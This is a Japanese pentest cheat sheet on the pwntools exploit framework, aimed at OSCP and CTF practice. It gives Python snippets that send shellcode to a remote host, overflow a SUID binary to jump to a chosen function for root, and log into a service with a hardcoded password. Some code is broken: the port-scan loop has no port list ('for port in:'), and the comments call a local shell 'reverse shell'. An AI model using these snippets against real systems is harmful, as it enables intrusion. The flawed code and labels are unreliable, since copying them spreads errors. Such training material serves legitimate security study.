# pwntools

## 🎯 概要
pwntoolsは、エクスプロイトコードの作成を劇的に高速化・簡略化するために設計された、Pythonベースの強力なフレームワークです。CTFのPwnable問題や、ペネトレーションテストにおけるバイナリ脆弱性の実証（PoC）作成に特化しています。ソケット通信、プロセスのローカル実行、シェルコードの生成（Shellcraft）、バイナリ解析（ELF）、ROPチェーンの構築など、低レイヤーの攻撃に必要な機能が網羅されています。

---

## 🛠 代表的な用途
- **バイナリエクスプロイト開発**: バッファオーバーフロー、フォーマット文字列攻撃、ROPなどの自動化。
- **ネットワークサービスの自動操作**: `nc`（netcat）や `telnet` ライブラリの代わりに、より高度な対話スクリプトを構築。
- **シェルコードの生成**: アーキテクチャに応じたペイロード（リバースシェル等）を瞬時に作成。
- **OSCP での利用ポイント**: OSCP自体はバイナリ解析の難易度は低めですが、独自プロトコルへのコマンド送信や、複雑な文字列入力を伴うネットワークサービスの操作を自動化する際に非常に重宝します。

---

## 🔍 基本コマンド
```python
# ターゲットへの接続（リモート）
io = remote('10.10.10.1', 80)

# ローカルバイナリの実行
io = process('./vuln_binary')

# データの送信
io.sendline(b'payload')

# 指定した文字列を受信するまで待機
io.recvuntil(b'password:')

# 対話モードへ切り替え（シェル取得後に使用）
io.interactive()
```

---

## 🧪 よく使う攻撃シナリオ
- **バッファオーバーフローの自動化**: 特定のオフセットを計算し、リターンアドレスを上書きしてシェルコードを実行。
- **フォーマット文字列攻撃**: `fmtstr_payload` 機能を用いて、メモリ上の任意のアドレスの値を自動的に書き換え。
- **ROP（Return-Oriented Programming）**: `ROP` モジュールを使用して、ASLRやNX（実行不能スタック）をバイパスするガジェットの連鎖を自動構築。

---

## 📌 フェーズ別コマンド例  
Pentest‑Playbook の各フェーズで実際に使うコード・コマンド例を記載します。  

---

### 🔎 Reconnaissance（サービス発見）
```python
# ポートが開放されているか、バナーが取得できるかスクリプトで一括チェック
for port in:
    try:
        r = remote('10.10.10.1', port, timeout=1)
        print(f"Port {port} is open: {r.recvline()}")
    except:
        pass
```

---

### 🧭 Enumeration（詳細調査）
```bash
# ターゲットバイナリのセキュリティ機構（NX, Canary, PIE等）を確認
checksec ./target_binary

# ELFファイルを解析し、シンボルや関数のアドレスを特定
python3 -c "from pwn import *; elf = ELF('./binary'); print(hex(elf.symbols['main']))"
```

---

### 🚪 Initial Access（初期侵入）
```python
# リバースシェルを実行するためのシェルコードを生成して送信
from pwn import *
context.arch = 'amd64'
shellcode = asm(shellcraft.amd64.linux.sh())
io = remote('10.10.10.1', 1337)
io.send(shellcode)
io.interactive()
```

---

### 📈 Privilege Escalation（権限昇格）
```python
# SUIDバイナリを悪用し、特定のオフセットでルート権限を取得するPoC
from pwn import *
elf = ELF('./suid_program')
offset = 120
payload = b'A' * offset + p64(elf.symbols['magic_function'])
io = process('./suid_program')
io.sendline(payload)
io.interactive()
```

---

### 🏢 Active Directory（AD）
基本的に関連なし。ただし、LDAPやSMBを介した独自ツールのやり取りをラップする場合に使用可能です。

---

## 🧰 便利オプション一覧
- `context.arch`：ターゲットのアーキテクチャ（'i386', 'amd64', 'arm'等）を指定。
- `context.os`：ターゲットのOS（'linux', 'windows'等）を指定。
- `context.log_level`：ログの出力レベル（'debug', 'info', 'error'）。'debug'にすると送受信パケットを全表示。
- `p64()` / `p32()`：数値をリトルエンディアンのバイト列にパック。
- `u64()` / `u32()`：バイト列を数値にアンパック。

---

## 🚀 実践例

```python
# 【1】リモートサーバーとの自動応答（ユーザー名を送信してシェル取得）
from pwn import *
io = remote('192.168.50.10', 4444)
io.recvuntil(b'Login:')
io.sendline(b'admin')
io.recvuntil(b'Password:')
io.sendline(b'P@ssw0rd123')
io.interactive()

# 【2】特定のアーキテクチャ向けのリバースシェル生成（Pythonワンライナー）
# python3 -c "from pwn import *; context.arch='amd64'; print(enhex(asm(shellcraft.sh())))"

# 【3】バイナリ内の全ガジェット（ROP）を検索してファイル保存
# ROPgadget --binary ./binary > gadgets.txt
```

---

## 🧩 他ツールとの組み合わせ
- **gdb** → `gdb.attach(io)` をコード内に記述することで、スクリプト実行中に自動的にデバッガを起動してデバッグ可能。
- **nmap** → nmapで特定した「未知の独自プロトコルポート」に対し、pwntoolsでデータ構造を試行錯誤しながら送信。
- **msfvenom** → msfvenomで生成したシェルコードを、pwntoolsのペイロードの一部として組み込む。

---

## 📝 注意点（OSCP 試験での使い方）
- **Pythonバージョンの互換性**: 現代のKali LinuxではPython 3が標準ですが、古い解説記事ではPython 2のコードが多いです。バイト列（`b'string'`）の扱いに注意してください。
- **自動化の是非**: OSCP試験では「エクスプロイトを自動的に探し出して実行するツール」は制限されていますが、**pwntoolsを用いて自分で書いたエクスプロイトスクリプトは許可されます。**
- **依存関係**: 試験用マシンに `pip install pwntools` を行う必要がある場合があります（通常Kaliにはプリインストールされています）。

---

## 🔗 参考リンク
- 公式：[Pwntools Documentation](https://docs.pwntools.com/)
- 公式：[Pwntools GitHub Repository](https://github.com/Gallopsled/pwntools)
- 良質解説：[Nightmare (Pwnable/Pwntools Course)](https://guyinatuxedo.github.io/)
